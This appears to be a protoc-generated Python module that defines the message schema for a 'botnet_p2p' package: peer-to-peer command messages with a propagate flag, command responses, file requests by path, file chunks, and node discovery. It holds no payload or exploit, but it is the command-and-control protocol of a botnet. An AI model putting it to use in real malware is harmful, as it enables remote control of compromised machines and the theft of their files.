# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: Message.proto

import sys
_b=sys.version_info[0]<3 and (lambda x:x) or (lambda x:x.encode('latin1'))
from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
from google.protobuf import descriptor_pb2
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='Message.proto',
  package='botnet_p2p',
  syntax='proto3',
  serialized_pb=_b('\n\rMessage.proto\x12\nbotnet_p2p\"\xfd\x08\n\x07Message\x12\x0c\n\x04uuid\x18\x01 \x01(\t\x12-\n\x04type\x18\x02 \x01(\x0e\x32\x1f.botnet_p2p.Message.MessageType\x12+\n\x06sender\x18\x03 \x01(\x0b\x32\x1b.botnet_p2p.Message.Contact\x12-\n\x08receiver\x18\x04 \x01(\x0b\x32\x1b.botnet_p2p.Message.Contact\x12\x11\n\tpropagate\x18\x05 \x01(\x08\x12\x31\n\x07\x63ommand\x18\x06 \x01(\x0b\x32\x1e.botnet_p2p.Message.CommandMsgH\x00\x12:\n\x08response\x18\x07 \x01(\x0b\x32&.botnet_p2p.Message.CommandResponseMsgH\x00\x12\x39\n\x0b\x66ileRequest\x18\x08 \x01(\x0b\x32\".botnet_p2p.Message.FileRequestMsgH\x00\x12\x35\n\tfileChunk\x18\t \x01(\x0b\x32 .botnet_p2p.Message.FileChunkMsgH\x00\x12\x33\n\x08\x66indNode\x18\n \x01(\x0b\x32\x1f.botnet_p2p.Message.FindNodeMsgH\x00\x12\x37\n\nfoundNodes\x18\x0b \x01(\x0b\x32!.botnet_p2p.Message.FoundNodesMsgH\x00\x1a@\n\x07\x43ontact\x12\x0c\n\x04guid\x18\x01 \x01(\t\x12\n\n\x02IP\x18\x02 \x01(\t\x12\x0c\n\x04port\x18\x03 \x01(\r\x12\r\n\x05isNAT\x18\x04 \x01(\x08\x1a\x34\n\nCommandMsg\x12\x0f\n\x07\x63ommand\x18\x01 \x01(\t\x12\x15\n\rshouldRespond\x18\x02 \x01(\x08\x1a`\n\x12\x43ommandResponseMsg\x12\r\n\x05value\x18\x01 \x01(\t\x12*\n\x06status\x18\x02 \x01(\x0e\x32\x1a.botnet_p2p.Message.Status\x12\x0f\n\x07\x63ommand\x18\x03 \x01(\t\x1a\x1e\n\x0e\x46ileRequestMsg\x12\x0c\n\x04path\x18\x01 \x01(\t\x1a_\n\x0c\x46ileChunkMsg\x12\x0c\n\x04uuid\x18\x01 \x01(\t\x12\x10\n\x08\x66ileName\x18\x02 \x01(\t\x12\x10\n\x08\x66ileSize\x18\x03 \x01(\r\x12\x0f\n\x07ordinal\x18\x04 \x01(\r\x12\x0c\n\x04\x64\x61ta\x18\x05 \x01(\x0c\x1a\x1b\n\x0b\x46indNodeMsg\x12\x0c\n\x04guid\x18\x01 \x01(\t\x1a;\n\rFoundNodesMsg\x12*\n\x05nodes\x18\x01 \x03(\x0b\x32\x1b.botnet_p2p.Message.Contact\"\x9a\x01\n\x0bMessageType\x12\x0b\n\x07\x43OMMAND\x10\x00\x12\x14\n\x10\x43OMMAND_RESPONSE\x10\x01\x12\x10\n\x0c\x46ILE_REQUEST\x10\x02\x12\x0e\n\nFILE_CHUNK\x10\x03\x12\x08\n\x04PING\x10\x04\x12\x11\n\rPING_RESPONSE\x10\x05\x12\t\n\x05LEAVE\x10\x06\x12\r\n\tFIND_NODE\x10\x07\x12\x0f\n\x0b\x46OUND_NODES\x10\x08\"\x1a\n\x06Status\x12\x08\n\x04\x46\x41IL\x10\x00\x12\x06\n\x02OK\x10\x01\x42\t\n\x07payloadb\x06proto3')
)



_MESSAGE_MESSAGETYPE = _descriptor.EnumDescriptor(
  name='MessageType',
  full_name='botnet_p2p.Message.MessageType',
  filename=None,
  file=DESCRIPTOR,
  values=[
    _descriptor.EnumValueDescriptor(
      name='COMMAND', index=0, number=0,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='COMMAND_RESPONSE', index=1, number=1,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='FILE_REQUEST', index=2, number=2,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='FILE_CHUNK', index=3, number=3,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='PING', index=4, number=4,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='PING_RESPONSE', index=5, number=5,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='LEAVE', index=6, number=6,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='FIND_NODE', index=7, number=7,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='FOUND_NODES', index=8, number=8,
      options=None,
      type=None),
  ],
  containing_type=None,
  options=None,
  serialized_start=986,
  serialized_end=1140,
)
_sym_db.RegisterEnumDescriptor(_MESSAGE_MESSAGETYPE)

_MESSAGE_STATUS = _descriptor.EnumDescriptor(
  name='Status',
  full_name='botnet_p2p.Message.Status',
  filename=None,
  file=DESCRIPTOR,
  values=[
    _descriptor.EnumValueDescriptor(
      name='FAIL', index=0, number=0,
      options=None,
      type=None),
    _descriptor.EnumValueDescriptor(
      name='OK', index=1, number=1,
      options=None,
      type=None),
  ],
  containing_type=None,
  options=None,
  serialized_start=1142,
  serialized_end=1168,
)
_sym_db.RegisterEnumDescriptor(_MESSAGE_STATUS)


_MESSAGE_CONTACT = _descriptor.Descriptor(
  name='Contact',
  full_name='botnet_p2p.Message.Contact',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='guid', full_name='botnet_p2p.Message.Contact.guid', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='IP', full_name='botnet_p2p.Message.Contact.IP', index=1,
      number=2, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='port', full_name='botnet_p2p.Message.Contact.port', index=2,
      number=3, type=13, cpp_type=3, label=1,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='isNAT', full_name='botnet_p2p.Message.Contact.isNAT', index=3,
      number=4, type=8, cpp_type=7, label=1,
      has_default_value=False, default_value=False,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=548,
  serialized_end=612,
)

_MESSAGE_COMMANDMSG = _descriptor.Descriptor(
  name='CommandMsg',
  full_name='botnet_p2p.Message.CommandMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='command', full_name='botnet_p2p.Message.CommandMsg.command', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='shouldRespond', full_name='botnet_p2p.Message.CommandMsg.shouldRespond', index=1,
      number=2, type=8, cpp_type=7, label=1,
      has_default_value=False, default_value=False,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=614,
  serialized_end=666,
)

_MESSAGE_COMMANDRESPONSEMSG = _descriptor.Descriptor(
  name='CommandResponseMsg',
  full_name='botnet_p2p.Message.CommandResponseMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='value', full_name='botnet_p2p.Message.CommandResponseMsg.value', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='status', full_name='botnet_p2p.Message.CommandResponseMsg.status', index=1,
      number=2, type=14, cpp_type=8, label=1,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='command', full_name='botnet_p2p.Message.CommandResponseMsg.command', index=2,
      number=3, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=668,
  serialized_end=764,
)

_MESSAGE_FILEREQUESTMSG = _descriptor.Descriptor(
  name='FileRequestMsg',
  full_name='botnet_p2p.Message.FileRequestMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='path', full_name='botnet_p2p.Message.FileRequestMsg.path', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=766,
  serialized_end=796,
)

_MESSAGE_FILECHUNKMSG = _descriptor.Descriptor(
  name='FileChunkMsg',
  full_name='botnet_p2p.Message.FileChunkMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='uuid', full_name='botnet_p2p.Message.FileChunkMsg.uuid', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='fileName', full_name='botnet_p2p.Message.FileChunkMsg.fileName', index=1,
      number=2, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='fileSize', full_name='botnet_p2p.Message.FileChunkMsg.fileSize', index=2,
      number=3, type=13, cpp_type=3, label=1,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='ordinal', full_name='botnet_p2p.Message.FileChunkMsg.ordinal', index=3,
      number=4, type=13, cpp_type=3, label=1,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='data', full_name='botnet_p2p.Message.FileChunkMsg.data', index=4,
      number=5, type=12, cpp_type=9, label=1,
      has_default_value=False, default_value=_b(""),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=798,
  serialized_end=893,
)

_MESSAGE_FINDNODEMSG = _descriptor.Descriptor(
  name='FindNodeMsg',
  full_name='botnet_p2p.Message.FindNodeMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='guid', full_name='botnet_p2p.Message.FindNodeMsg.guid', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=895,
  serialized_end=922,
)

_MESSAGE_FOUNDNODESMSG = _descriptor.Descriptor(
  name='FoundNodesMsg',
  full_name='botnet_p2p.Message.FoundNodesMsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='nodes', full_name='botnet_p2p.Message.FoundNodesMsg.nodes', index=0,
      number=1, type=11, cpp_type=10, label=3,
      has_default_value=False, default_value=[],
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=924,
  serialized_end=983,
)

_MESSAGE = _descriptor.Descriptor(
  name='Message',
  full_name='botnet_p2p.Message',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='uuid', full_name='botnet_p2p.Message.uuid', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=_b("").decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='type', full_name='botnet_p2p.Message.type', index=1,
      number=2, type=14, cpp_type=8, label=1,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='sender', full_name='botnet_p2p.Message.sender', index=2,
      number=3, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='receiver', full_name='botnet_p2p.Message.receiver', index=3,
      number=4, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='propagate', full_name='botnet_p2p.Message.propagate', index=4,
      number=5, type=8, cpp_type=7, label=1,
      has_default_value=False, default_value=False,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='command', full_name='botnet_p2p.Message.command', index=5,
      number=6, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='response', full_name='botnet_p2p.Message.response', index=6,
      number=7, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='fileRequest', full_name='botnet_p2p.Message.fileRequest', index=7,
      number=8, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='fileChunk', full_name='botnet_p2p.Message.fileChunk', index=8,
      number=9, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='findNode', full_name='botnet_p2p.Message.findNode', index=9,
      number=10, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
    _descriptor.FieldDescriptor(
      name='foundNodes', full_name='botnet_p2p.Message.foundNodes', index=10,
      number=11, type=11, cpp_type=10, label=1,
      has_default_value=False, default_value=None,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None, file=DESCRIPTOR),
  ],
  extensions=[
  ],
  nested_types=[_MESSAGE_CONTACT, _MESSAGE_COMMANDMSG, _MESSAGE_COMMANDRESPONSEMSG, _MESSAGE_FILEREQUESTMSG, _MESSAGE_FILECHUNKMSG, _MESSAGE_FINDNODEMSG, _MESSAGE_FOUNDNODESMSG, ],
  enum_types=[
    _MESSAGE_MESSAGETYPE,
    _MESSAGE_STATUS,
  ],
  options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
    _descriptor.OneofDescriptor(
      name='payload', full_name='botnet_p2p.Message.payload',
      index=0, containing_type=None, fields=[]),
  ],
  serialized_start=30,
  serialized_end=1179,
)

_MESSAGE_CONTACT.containing_type = _MESSAGE
_MESSAGE_COMMANDMSG.containing_type = _MESSAGE
_MESSAGE_COMMANDRESPONSEMSG.fields_by_name['status'].enum_type = _MESSAGE_STATUS
_MESSAGE_COMMANDRESPONSEMSG.containing_type = _MESSAGE
_MESSAGE_FILEREQUESTMSG.containing_type = _MESSAGE
_MESSAGE_FILECHUNKMSG.containing_type = _MESSAGE
_MESSAGE_FINDNODEMSG.containing_type = _MESSAGE
_MESSAGE_FOUNDNODESMSG.fields_by_name['nodes'].message_type = _MESSAGE_CONTACT
_MESSAGE_FOUNDNODESMSG.containing_type = _MESSAGE
_MESSAGE.fields_by_name['type'].enum_type = _MESSAGE_MESSAGETYPE
_MESSAGE.fields_by_name['sender'].message_type = _MESSAGE_CONTACT
_MESSAGE.fields_by_name['receiver'].message_type = _MESSAGE_CONTACT
_MESSAGE.fields_by_name['command'].message_type = _MESSAGE_COMMANDMSG
_MESSAGE.fields_by_name['response'].message_type = _MESSAGE_COMMANDRESPONSEMSG
_MESSAGE.fields_by_name['fileRequest'].message_type = _MESSAGE_FILEREQUESTMSG
_MESSAGE.fields_by_name['fileChunk'].message_type = _MESSAGE_FILECHUNKMSG
_MESSAGE.fields_by_name['findNode'].message_type = _MESSAGE_FINDNODEMSG
_MESSAGE.fields_by_name['foundNodes'].message_type = _MESSAGE_FOUNDNODESMSG
_MESSAGE_MESSAGETYPE.containing_type = _MESSAGE
_MESSAGE_STATUS.containing_type = _MESSAGE
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['command'])
_MESSAGE.fields_by_name['command'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['response'])
_MESSAGE.fields_by_name['response'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['fileRequest'])
_MESSAGE.fields_by_name['fileRequest'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['fileChunk'])
_MESSAGE.fields_by_name['fileChunk'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['findNode'])
_MESSAGE.fields_by_name['findNode'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
_MESSAGE.oneofs_by_name['payload'].fields.append(
  _MESSAGE.fields_by_name['foundNodes'])
_MESSAGE.fields_by_name['foundNodes'].containing_oneof = _MESSAGE.oneofs_by_name['payload']
DESCRIPTOR.message_types_by_name['Message'] = _MESSAGE
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Message = _reflection.GeneratedProtocolMessageType('Message', (_message.Message,), dict(

  Contact = _reflection.GeneratedProtocolMessageType('Contact', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_CONTACT,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.Contact)
    ))
  ,

  CommandMsg = _reflection.GeneratedProtocolMessageType('CommandMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_COMMANDMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.CommandMsg)
    ))
  ,

  CommandResponseMsg = _reflection.GeneratedProtocolMessageType('CommandResponseMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_COMMANDRESPONSEMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.CommandResponseMsg)
    ))
  ,

  FileRequestMsg = _reflection.GeneratedProtocolMessageType('FileRequestMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_FILEREQUESTMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.FileRequestMsg)
    ))
  ,

  FileChunkMsg = _reflection.GeneratedProtocolMessageType('FileChunkMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_FILECHUNKMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.FileChunkMsg)
    ))
  ,

  FindNodeMsg = _reflection.GeneratedProtocolMessageType('FindNodeMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_FINDNODEMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.FindNodeMsg)
    ))
  ,

  FoundNodesMsg = _reflection.GeneratedProtocolMessageType('FoundNodesMsg', (_message.Message,), dict(
    DESCRIPTOR = _MESSAGE_FOUNDNODESMSG,
    __module__ = 'Message_pb2'
    # @@protoc_insertion_point(class_scope:botnet_p2p.Message.FoundNodesMsg)
    ))
  ,
  DESCRIPTOR = _MESSAGE,
  __module__ = 'Message_pb2'
  # @@protoc_insertion_point(class_scope:botnet_p2p.Message)
  ))
_sym_db.RegisterMessage(Message)
_sym_db.RegisterMessage(Message.Contact)
_sym_db.RegisterMessage(Message.CommandMsg)
_sym_db.RegisterMessage(Message.CommandResponseMsg)
_sym_db.RegisterMessage(Message.FileRequestMsg)
_sym_db.RegisterMessage(Message.FileChunkMsg)
_sym_db.RegisterMessage(Message.FindNodeMsg)
_sym_db.RegisterMessage(Message.FoundNodesMsg)


# @@protoc_insertion_point(module_scope)